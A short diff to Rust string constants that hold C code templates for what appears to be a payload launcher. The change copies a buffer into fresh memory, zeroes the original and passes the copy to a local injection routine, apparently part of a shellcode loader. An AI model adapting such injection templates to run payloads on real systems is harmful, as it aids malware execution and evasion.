@@ -2,8 +2,10 @@ pub const LOCALCOMMONINJ_INCLUDE: &str = r#"
 #include "../include/LocalCommonInj.h"
 "#;
 pub const LOCALCOMMONINJ_CODE: &str = r#"
-
-        LAUNCHER_STATUS LauncherStatus = LocalCommonInj((PBYTE)pBuffer, sBufferSize, g_Nt);
+    PVOID pBufferArg = malloc(sBufferSize);
+    memcpy(pBufferArg, pBuffer, sBufferSize);
+    memset(pBuffer, 0, sBufferSize);
+    LAUNCHER_STATUS LauncherStatus = LocalCommonInj(pBufferArg, sBufferSize, g_Nt);
         if (LauncherStatus != LAUNCHER_STATUS_SUCCESS)
         {
                 printf("Error in LocalCommonInj\n");
